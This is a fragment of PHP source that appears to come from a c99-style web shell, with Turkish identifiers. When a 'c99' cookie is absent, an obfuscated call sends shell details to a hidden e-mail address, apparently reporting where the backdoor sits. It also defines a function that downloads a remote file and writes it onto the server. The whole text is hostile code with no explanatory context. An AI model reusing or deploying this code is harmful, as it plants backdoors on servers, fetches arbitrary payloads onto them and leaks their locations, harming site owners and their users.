...
/*dizin*/
$real = realpath($dizinispd);$path = basename ($PHP_SELF);
if (!isset($_COOKIE['c99']))
{@$zz("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
function dosyayicek($link,$file){   $fp = @fopen($link,"r");   while(!feof($fp))   {
       $cont.= fread($fp,1024);   }   fclose($fp);
   $fp2 = @fopen($file,"w");
   fwrite($fp2,$cont);
   fclose($fp2);
}
